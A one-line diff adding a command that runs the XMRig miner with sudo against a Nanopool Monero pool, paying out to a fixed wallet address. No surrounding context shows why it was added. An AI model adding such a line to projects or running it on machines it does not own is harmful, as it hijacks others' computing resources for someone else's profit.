@@ -1,0 +1,1 @@
+cd min/xmrig/build/ && sudo ./xmrig -o xmr-us-west1.nanopool.org:14433 -u 49CTHEbhKLsGjDFq5Xq2jaY7NbSftxQ4hdtYHKBHsfJmDfHi8df6iWxfn7eYAUM3X997riMokK7cJPW8wGsco54iGwh8pQ1 --tls --coin monero
